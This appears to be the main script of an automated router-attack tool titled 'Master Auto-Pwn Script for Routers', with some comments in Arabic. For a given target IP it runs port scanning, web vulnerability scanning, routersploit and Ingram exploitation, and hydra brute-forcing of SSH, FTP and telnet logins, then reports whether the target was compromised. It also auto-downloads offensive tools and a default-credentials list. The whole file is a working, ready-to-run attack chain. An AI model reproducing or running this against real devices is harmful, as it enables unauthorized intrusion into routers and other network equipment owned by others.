#!/usr/bin/env python3

import argparse
import sys
import os
import subprocess
from core.scanner import run_nmap
from core.web_enum import run_nuclei, run_dirsearch, run_sqlmap
from core.exploitation import run_routersploit, run_ingram
from core.bruteforce import run_hydra

def update_self_repo():
    base_dir = os.path.dirname(os.path.abspath(__file__))
    git_dir = os.path.join(base_dir, ".git")
    print(f"[*] Repository base path: {base_dir}")
    if os.path.exists(git_dir):
        print("[*] Updating local repository from GitHub...")
        try:
            result = subprocess.run(
                ["git", "pull", "--ff-only"],
                cwd=base_dir,
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            if result.stdout:
                print(result.stdout.strip())
            print("[+] Repository update completed.")
        except FileNotFoundError:
            print("[!] Git is not installed or not available in PATH.")
        except subprocess.CalledProcessError as exc:
            print("[!] Failed to pull latest repository updates.")
            if exc.stdout:
                print(exc.stdout.strip())
            if exc.stderr:
                print(exc.stderr.strip())
    else:
        print("[*] No local Git repository found; skipping repository update.")

def prompt_next_stage():
    while True:
        choice = input("\n[!] Ctrl+C detected. Do you want to skip the current phase and continue to the next stage? [Y/n] ").strip().lower()
        if choice in ("", "y", "yes"):
            return True
        if choice in ("n", "no", "q", "quit", "exit"):
            return False
        print("Please enter 'y' to continue or 'n' to exit.")


def auto_install_tools():
    print("[*] Checking dependencies and tools...")
    base_dir = os.path.dirname(os.path.abspath(__file__))
    tools_dir = os.path.join(base_dir, "tools")
    os.makedirs(tools_dir, exist_ok=True)
    
    tools_repos = {
        "routersploit": "https://github.com/threat9/routersploit.git",
        "ingram": "https://github.com/jorhelp/Ingram.git",
        "dirsearch": "https://github.com/maurosoria/dirsearch.git",
        "sqlmap": "https://github.com/sqlmapproject/sqlmap.git",
        "DefaultCreds-cheat-sheet": "https://github.com/ihebski/DefaultCreds-cheat-sheet.git"
    }
    
    missing_tools = False
    for tool_name, repo_url in tools_repos.items():
        tool_path = os.path.join(tools_dir, tool_name)
        if not os.path.exists(tool_path) or not os.listdir(tool_path):
            print(f"[!] {tool_name} is missing. Downloading automatically...")
            # إزالة المجلد الفارغ إذا وجد لتجنب أخطاء git clone
            if os.path.exists(tool_path):
                import shutil
                shutil.rmtree(tool_path, ignore_errors=True)
            subprocess.run(["git", "clone", "--depth", "1", repo_url, tool_path])
            missing_tools = True
        else:
            git_dir = os.path.join(tool_path, ".git")
            if os.path.exists(git_dir):
                print(f"[*] Updating {tool_name} to latest version...")
                try:
                    subprocess.run(["git", "pull", "--ff-only"], cwd=tool_path, check=True)
                except subprocess.CalledProcessError:
                    print(f"[!] Failed to update {tool_name}. Skipping.")
            
    req_path = os.path.join(base_dir, "requirements.txt")
    flag_file = os.path.join(tools_dir, ".installed")
    
    if missing_tools or not os.path.exists(flag_file):
        print("[*] Installing Python requirements (This might take a moment)...")
        if os.path.exists(req_path):
            subprocess.run(["pip3", "install", "-r", req_path, "--break-system-packages"])
        with open(flag_file, "w") as f:
            f.write("done")
            
    print("[+] All tools and dependencies are ready!\n")

def main():
    parser = argparse.ArgumentParser(description="Master Auto-Pwn Script for Routers (Modular Version)")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    args = parser.parse_args()
    ip = args.target

    # التحقق من التحديثات من GitHub قبل التشغيل
    update_self_repo()
    auto_install_tools()

    print(f"======================================================")
    print(f"      TARGET ACQUIRED: {ip}                           ")
    print(f"======================================================\n")

    # إنشاء مجلد مخصص للهدف
    # إذا كنت تستخدم كالي، سيتم إنشاؤه داخل مجلد targets في نفس مسار السكربت
    target_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "targets", ip)
    os.makedirs(target_dir, exist_ok=True)
    print(f"[*] Workspace created for target: {target_dir}\n")

    # المرحلة الأولى: الاستطلاع
    print(">>> PHASE 1: Scanning & Reconnaissance")
    try:
        open_ports = run_nmap(ip, target_dir)
    except KeyboardInterrupt:
        if not prompt_next_stage():
            print("\n[-] Exiting as requested.")
            sys.exit(0)
        open_ports = []
    
    if not open_ports:
        print(f"[-] No open ports found on {ip}. Moving on to the next phases.")
        open_ports = []
        web_ports = []
        login_ports = []
    else:
        web_ports = [p['port'] for p in open_ports if p['port'] in [80, 443, 8080, 8443] or 'http' in p['service'].lower()]
        login_ports = [p for p in open_ports if p['port'] in [21, 22, 23] or p['service'].lower() in ['ssh', 'ftp', 'telnet']]
    
    exploited = False

    # المرحلة الثانية: استغلال الويب (إن وجد)
    if web_ports and not exploited:
        print("\n======================================================")
        print(">>> PHASE 2: Web Enumeration & Vulnerability Scanning")
        print("======================================================")
        try:
            for port in web_ports:
                target_url = f"http://{ip}:{port}" if port not in [443, 8443] else f"https://{ip}:{port}"
                print(f"\n[*] Target URL: {target_url}")
                
                if run_nuclei(target_url, target_dir):
                    exploited = True
                    break
                
                run_dirsearch(target_url, target_dir)
        except KeyboardInterrupt:
            if not prompt_next_stage():
                print("\n[-] Exiting as requested.")
                sys.exit(0)

    # المرحلة الثالثة: استغلال الراوترات والأجهزة المدمجة
    if not exploited:
        print("\n======================================================")
        print(">>> PHASE 3: Router & Device Exploitation")
        print("======================================================")
        try:
            if run_routersploit(ip, target_dir):
                exploited = True
            elif run_ingram(ip, target_dir):
                exploited = True
        except KeyboardInterrupt:
            if not prompt_next_stage():
                print("\n[-] Exiting as requested.")
                sys.exit(0)

    # المرحلة الرابعة: التخمين كملاذ أخير
    if not exploited and login_ports:
        try:
            if run_hydra(ip, login_ports, target_dir):
                exploited = True
        except KeyboardInterrupt:
            if not prompt_next_stage():
                print("\n[-] Exiting as requested.")
                sys.exit(0)

    print("\n======================================================")
    if exploited:
        print("[★] SUCCESS: Target has been compromised!")
    else:
        print("[-] FAILURE: Could not exploit the target with available tools.")
    print(f"[*] All output logs for {ip} have been saved in: {target_dir}")
    print("======================================================")

if __name__ == "__main__":
    main()
